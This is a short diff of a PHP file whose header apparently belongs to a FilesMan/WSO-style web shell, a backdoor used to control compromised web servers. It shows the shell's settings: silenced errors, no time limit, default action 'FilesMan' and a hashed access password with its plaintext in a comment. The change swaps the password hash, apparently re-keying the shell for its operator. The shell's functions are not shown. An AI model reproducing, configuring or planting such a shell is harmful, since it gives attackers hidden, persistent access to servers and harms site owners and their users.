@@ -3,7 +3,7 @@ session_start();
 error_reporting(0);
 set_time_limit(0);
 
-$auth_pass = "5211c3c730f27080ca4b520b956a89f1"; // password: tapibohong
+$auth_pass = "979dda9ea8a965ebcfbe195a4e2b02ed"; // password: tapibohong
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
